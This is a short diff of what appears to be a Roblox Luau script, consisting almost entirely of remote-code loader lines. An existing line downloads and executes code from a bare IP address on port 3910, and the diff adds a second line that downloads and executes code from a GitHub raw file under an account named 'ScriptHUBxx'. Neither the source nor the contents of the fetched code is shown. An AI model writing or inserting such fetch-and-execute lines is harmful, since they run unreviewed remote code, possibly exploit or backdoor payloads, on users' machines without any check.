@@ -1,5 +1,6 @@
 ID="816b6423-53fa-47a7-8ae7-15d5adc379da";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptHUBxx/Loader/refs/heads/main/loveyou"))()
 
 
 
